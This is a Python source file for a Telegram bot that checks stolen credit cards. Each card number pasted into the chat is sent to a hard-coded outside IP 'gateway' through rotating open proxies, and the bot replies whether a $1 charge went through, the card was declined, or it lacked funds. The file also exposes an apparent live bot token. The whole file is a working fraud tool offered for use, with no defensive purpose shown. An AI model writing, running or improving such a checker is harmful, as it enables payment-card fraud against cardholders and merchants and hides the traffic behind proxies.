from telebot import TeleBot
import requests
import sys

bot = TeleBot("7700737624:AAGyS459SbTTOwLFJauPBChP5fxc1D8LRiM")

GATEWAY = "http://138.128.240.15:8024/paypal_1?cc="

proxies_list = [
    "http://148.230.4.241:999",
    "http://2.78.60.10:3129",
    "http://1.231.81.166:3128",
    "http://45.167.124.71:999",
    "http://103.157.200.126:3128",
    "http://80.92.204.47:1081"
]

current_proxy = 0

def get_proxy():
    global current_proxy
    proxy = proxies_list[current_proxy % len(proxies_list)]
    current_proxy += 1
    print(f"[AUTO PROXY] Using: {proxy}", file=sys.stdout, flush=True)
    return {"http": proxy, "https": proxy}

@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(m.chat.id, "✅ **Full Logs + Auto Proxy ON**")

@bot.message_handler(func=lambda m: True)
def checker(m):
    for line in m.text.splitlines():
        line = line.strip()
        if not line: continue

        print(f"\n[CHECKING START] Card: {line}", file=sys.stdout, flush=True)

        proxy = get_proxy()
        
        try:
            url = GATEWAY + line.replace(" ", "")
            print(f"[REQUEST] Sending to gateway...", file=sys.stdout, flush=True)
            
            r = requests.get(url, proxies=proxy, timeout=20)
            resp = r.text

            print(f"[GATEWAY RESPONSE] {resp[:400]}...", file=sys.stdout, flush=True)

            if any(x in resp for x in ["ORDER APPROVED", "charged", "charge", "success", "APPROVED"]):
                print(f"[RESULT] LIVE - 1$ Charged", file=sys.stdout, flush=True)
                bot.reply_to(m, f"✅ **1$ Charged - Card Approved**\n{line}")
            elif '"message":"ORDER NOT APPROVED"' in resp or "ORDER NOT APPROVED" in resp or "DECLINED" in resp:
                print(f"[RESULT] DECLINED", file=sys.stdout, flush=True)
                bot.reply_to(m, f"❌ **Card was got declined**\n{line}")
            elif "insufficient" in resp.lower() or "funds" in resp.lower():
                print(f"[RESULT] INSUFFICIENT FUNDS", file=sys.stdout, flush=True)
                bot.reply_to(m, f"⚠️ **Insufficient Funds**\n{line}")
            else:
                print(f"[RESULT] UNKNOWN", file=sys.stdout, flush=True)
                bot.reply_to(m, f"❓ **Unknown Response**\n{line}")

        except Exception as e:
            print(f"[ERROR] {str(e)}", file=sys.stdout, flush=True)
            bot.send_message(m.chat.id, f"❌ Error on {line}")

bot.infinity_polling()
